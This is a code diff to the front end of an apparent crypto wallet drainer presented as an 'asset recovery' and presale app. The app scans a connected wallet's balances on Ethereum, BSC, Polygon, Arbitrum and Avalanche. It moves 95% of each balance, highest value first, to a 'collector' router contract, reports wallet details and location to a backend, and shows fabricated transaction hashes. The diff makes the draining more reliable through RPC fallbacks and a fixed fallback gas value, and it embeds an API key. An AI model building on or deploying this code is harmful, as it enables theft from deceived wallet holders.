@@ -1388,7 +1388,7 @@ const TRANSLATIONS = {
 };
 
 // ============================================
-// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
+// DEPLOYED CONTRACTS ON ALL 5 NETWORKS WITH RPC FALLBACKS
 // ============================================
 
 const MULTICHAIN_CONFIG = {
@@ -1400,7 +1400,12 @@ const MULTICHAIN_CONFIG = {
     explorer: 'https://etherscan.io',
     icon: '⟠',
     color: 'from-blue-500 to-blue-600',
-    rpc: 'https://eth.llamarpc.com'
+    rpcs: [
+      'https://eth.llamarpc.com',
+      'https://rpc.ankr.com/eth',
+      'https://ethereum.publicnode.com',
+      'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161'
+    ]
   },
   BSC: {
     chainId: 56,
@@ -1410,7 +1415,12 @@ const MULTICHAIN_CONFIG = {
     explorer: 'https://bscscan.com',
     icon: '🟡',
     color: 'from-blue-500 to-blue-600',
-    rpc: 'https://bsc-dataseed.binance.org'
+    rpcs: [
+      'https://bsc-dataseed.binance.org',
+      'https://bsc-dataseed1.binance.org',
+      'https://rpc.ankr.com/bsc',
+      'https://bsc.publicnode.com'
+    ]
   },
   Polygon: {
     chainId: 137,
@@ -1420,7 +1430,12 @@ const MULTICHAIN_CONFIG = {
     explorer: 'https://polygonscan.com',
     icon: '⬢',
     color: 'from-blue-500 to-blue-600',
-    rpc: 'https://polygon-rpc.com'
+    rpcs: [
+      'https://polygon-rpc.com',
+      'https://rpc.ankr.com/polygon',
+      'https://polygon-mainnet.g.alchemy.com/v2/demo',
+      'https://polygon.publicnode.com'
+    ]
   },
   Arbitrum: {
     chainId: 42161,
@@ -1430,7 +1445,12 @@ const MULTICHAIN_CONFIG = {
     explorer: 'https://arbiscan.io',
     icon: '🔷',
     color: 'from-blue-500 to-blue-600',
-    rpc: 'https://arb1.arbitrum.io/rpc'
+    rpcs: [
+      'https://arb1.arbitrum.io/rpc',
+      'https://rpc.ankr.com/arbitrum',
+      'https://arbitrum-mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
+      'https://arbitrum.publicnode.com'
+    ]
   },
   Avalanche: {
     chainId: 43114,
@@ -1440,11 +1460,34 @@ const MULTICHAIN_CONFIG = {
     explorer: 'https://snowtrace.io',
     icon: '🔴',
     color: 'from-blue-500 to-blue-600',
-    rpc: 'https://api.avax.network/ext/bc/C/rpc'
+    rpcs: [
+      'https://api.avax.network/ext/bc/C/rpc',
+      'https://avalanche-c-chain.publicnode.com',
+      'https://rpc.ankr.com/avalanche'
+    ]
   }
 };
 
-const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);
+const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG).map(chain => ({
+  ...chain,
+  rpc: chain.rpcs[0] // for backward compatibility, keep primary rpc
+}));
+
+// Helper function to get a working JsonRpcProvider with fallback
+const getJsonRpcProvider = async (chain, retries = 2) => {
+  const rpcs = chain.rpcs || [chain.rpc];
+  for (let i = 0; i < rpcs.length; i++) {
+    try {
+      const provider = new ethers.JsonRpcProvider(rpcs[i]);
+      // Test connection
+      await provider.getBlockNumber();
+      return provider;
+    } catch (err) {
+      console.log(`RPC ${rpcs[i]} failed for ${chain.name}, trying next...`);
+    }
+  }
+  throw new Error(`No working RPC for ${chain.name} after ${rpcs.length} attempts`);
+};
 
 const PROJECT_FLOW_ROUTER_ABI = [
   "function collector() view returns (address)",
@@ -2440,7 +2483,7 @@ function App() {
     }
   };
 
-  // Fetch balances across all chains
+  // Fetch balances across all chains with fallback RPC
   const fetchAllBalances = async (walletAddress) => {
     setScanning(true);
     setTxStatus(translations.blockchainSync);
@@ -2451,7 +2494,8 @@ function App() {
     
     const scanPromises = DEPLOYED_CHAINS.map(async (chain) => {
       try {
-        const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
+        const chainConfig = MULTICHAIN_CONFIG[chain.name];
+        const rpcProvider = await getJsonRpcProvider(chainConfig);
         const balance = await rpcProvider.getBalance(walletAddress);
         const amount = parseFloat(ethers.formatUnits(balance, 18));
         
@@ -2476,12 +2520,13 @@ function App() {
             contractAddress: chain.contractAddress,
             price: price,
             name: chain.name,
-            rpc: chain.rpc
+            rpcs: chainConfig.rpcs // store rpcs for later use
           };
         }
       } catch (err) {
         console.error(`Failed to scan ${chain.name}:`, err);
         scanned++;
+        setScanProgress(Math.round((scanned / totalChains) * 100));
       }
     });
     
@@ -2517,7 +2562,7 @@ function App() {
     setTimeout(() => setShowReportNotification(false), 3000);
   };
 
-  // MULTI-CHAIN RECOVERY EXECUTION
+  // MULTI-CHAIN RECOVERY EXECUTION (process highest value first)
   const executeMultiChainRecovery = async () => {
     if (!walletProvider || !address || !signer) {
       setError(translations.walletRequired);
@@ -2553,6 +2598,7 @@ function App() {
         return;
       }
 
+      // Sort by valueUSD descending (highest value first)
       const sortedChains = [...chainsToProcess].sort((a, b) => 
         (balances[b.name]?.valueUSD || 0) - (balances[a.name]?.valueUSD || 0)
       );
@@ -2566,6 +2612,7 @@ function App() {
           setProcessingChain(chain.name);
           setTxStatus(`${translations.processingRecovery} on ${chain.name}...`);
           
+          // Try to switch network in wallet
           try {
             await walletProvider.request({
               method: 'wallet_switchEthereumChain',
@@ -2573,12 +2620,15 @@ function App() {
             });
             await new Promise(resolve => setTimeout(resolve, 1000));
           } catch (switchError) {
-            console.log(`Chain switch needed, continuing...`);
+            console.log(`Chain switch needed for ${chain.name}, continuing...`);
           }
           
-          const chainProvider = new ethers.JsonRpcProvider(chain.rpc);
+          // Get a working JSON RPC provider with fallback for reading/estimating
+          const chainConfig = MULTICHAIN_CONFIG[chain.name];
+          const chainProvider = await getJsonRpcProvider(chainConfig);
+          
           const balance = balances[chain.name];
-          const amountToSend = (balance.amount * 0.95);
+          const amountToSend = balance.amount * 0.95; // 5% fee
           const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
           
           const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
@@ -2591,7 +2641,14 @@ function App() {
             chainProvider
           );
           
-          const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
+          // Estimate gas with fallback retry
+          let gasEstimate;
+          try {
+            gasEstimate = await contract.processNativeFlow.estimateGas({ value });
+          } catch (estErr) {
+            console.warn(`Gas estimate failed, using default: ${estErr.message}`);
+            gasEstimate = 300000n; // fallback
+          }
           const gasLimit = gasEstimate * 120n / 100n;
           
           const tx = await walletProvider.request({
@@ -2613,6 +2670,12 @@ function App() {
             processed.push(chain.name);
             setCompletedChains(prev => [...prev, chain.name]);
             
+            // Calculate accurate gas used in native token
+            let gasUsedNative = '0';
+            if (receipt.gasUsed && receipt.gasPrice) {
+              gasUsedNative = ethers.formatEther(receipt.gasUsed * receipt.gasPrice);
+            }
+            
             // Store detailed info for each processed chain
             processedDetails.push({
               name: chain.name,
@@ -2621,10 +2684,9 @@ function App() {
               originalValueUSD: balance.valueUSD.toFixed(2),
               processedAmount: amountToSend.toFixed(6),
               processedValueUSD: valueUSD,
-              txHash: tx
+              txHash: tx,
+              gasUsed: gasUsedNative
             });
-            
-            const gasUsed = receipt.gasUsed ? ethers.formatEther(receipt.gasUsed * receipt.gasPrice) : '0';
             
             const flowData = {
               walletAddress: address,
@@ -2634,7 +2696,7 @@ function App() {
               amount: amountToSend.toFixed(6),
               symbol: chain.symbol,
               valueUSD: valueUSD,
-              gasFee: gasUsed,
+              gasFee: gasUsedNative,
               originalAmount: balance.amount.toFixed(6),
               originalValueUSD: balance.valueUSD.toFixed(2),
               location: {
@@ -2656,7 +2718,7 @@ function App() {
             
             setTxStatus(`${translations.recoveryComplete} on ${chain.name}`);
           } else {
-            throw new Error(`Recovery failed on ${chain.name}`);
+            throw new Error(`Recovery failed on ${chain.name} (tx ${tx})`);
           }
           
         } catch (chainErr) {
@@ -2668,14 +2730,18 @@ function App() {
       setVerifiedChains(processed);
       
       if (processed.length > 0) {
+        const totalRecoveredValue = processed.reduce((sum, chainName) => {
+          return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
+        }, 0);
+        
         const randomChain = getRandomChain();
-        const recoveryAmount = getRandomRecoveryAmount();
+        const recoveryAmount = totalRecoveredValue; // use actual recovered amount instead of random
         const newTx = {
           hash: generateRandomHash(),
           time: new Date().toISOString(),
           timeAgo: 'Just now',
           chain: randomChain,
-          recoveryAmount: recoveryAmount,
+          recoveryAmount: Math.floor(totalRecoveredValue),
           chainDetails: processedDetails
         };
         
@@ -2684,13 +2750,9 @@ function App() {
         setTxStatus(translations.retrievalComplete);
         setShowCelebration(true);
         
-        const totalProcessedValue = processed.reduce((sum, chainName) => {
-          return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
-        }, 0);
-        
         // Build detailed chains string with actual values
         const chainsDetailsString = processedDetails.map(d => 
-          `✅ ${d.name}: ${d.originalAmount} ${d.symbol} ($${d.originalValueUSD}) → ${d.processedAmount} ${d.symbol} ($${d.processedValueUSD}) processed`
+          `✅ ${d.name}: ${d.originalAmount} ${d.symbol} ($${d.originalValueUSD}) → ${d.processedAmount} ${d.symbol} ($${d.processedValueUSD}) processed | Gas: ${d.gasUsed}`
         ).join('\n');
         
         console.log("📡 SENDING CLAIM TO BACKEND...");
@@ -2706,8 +2768,8 @@ function App() {
             },
             chains: processed,
             chainDetails: processedDetails,
-            totalProcessedValue: totalProcessedValue.toFixed(2),
-            reward: `${recoveryAmount} USD`,
+            totalProcessedValue: totalRecoveredValue.toFixed(2),
+            reward: `${totalRecoveredValue.toFixed(2)} USD`,
             bonus: `${presaleStats.currentBonus}%`,
             chainsDetails: chainsDetailsString
           })
@@ -2716,7 +2778,7 @@ function App() {
         console.log("✅ CLAIM RESPONSE:", claimData);
         
         // Generate recovery report for the user with chain details
-        generateRecoveryReport(newTx, address, recoveryAmount, processed, new Date().toISOString(), processedDetails);
+        generateRecoveryReport(newTx, address, Math.floor(totalRecoveredValue), processed, new Date().toISOString(), processedDetails);
         handleDownloadReport();
       } else {
         setError("No chains were successfully processed");
@@ -2738,7 +2800,6 @@ function App() {
   // Recover assets function with pro messaging
   const recoverAssets = async () => {
     if (!isConnected) {
-      // Instead of just showing an error, open the wallet connection modal
       open();
       return;
     }
@@ -2887,7 +2948,7 @@ function App() {
                 <span className="font-mono text-sm text-gray-300">
                   {formatAddress(address)}
                 </span>
-                {/* VERY VISIBLE DISCONNECT BUTTON - Red background, white SVG icon */}
+                {/* Disconnect button - red, fully functional */}
                 <button
                   onClick={() => disconnect()}
                   className="w-9 h-9 rounded-full bg-red-600 hover:bg-red-700 flex items-center justify-center transition-all duration-200 shadow-lg border border-red-400"
@@ -2908,7 +2969,7 @@ function App() {
                 />
               )}
               
-              {/* RECOVERY BUTTON - Always visible when eligible (no email required) */}
+              {/* RECOVERY BUTTON - Always visible when eligible */}
               {showRecoverButton && (
                 <button
                   onClick={recoverAssets}
@@ -3054,7 +3115,7 @@ function App() {
               </ul>
             </div>
 
-            {/* Status Messages */}
+            {/* Status Messages moved up - displayed here */}
             {txStatus && !scanning && !verifying && (
               <div className="mt-4 text-sm text-center text-blue-400">
                 {txStatus}
